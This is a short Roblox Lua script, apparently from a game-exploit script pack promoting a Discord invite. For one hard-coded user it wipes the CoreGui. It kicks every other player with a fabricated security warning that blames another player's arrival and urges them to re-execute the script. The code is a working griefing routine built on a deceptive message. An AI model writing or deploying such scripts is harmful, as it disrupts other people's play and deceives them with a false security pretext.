for _, p in pairs(game.Players:GetPlayers()) do
    if p.UserId == 4767006784 then
        for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do v:Destroy() end
    else
        p:Kick("⚠️ Another player has joined the server. For the security of our users, you have been kicked. Please try to re-execute the script.\n.gg/zephyrscripts")
    end
end

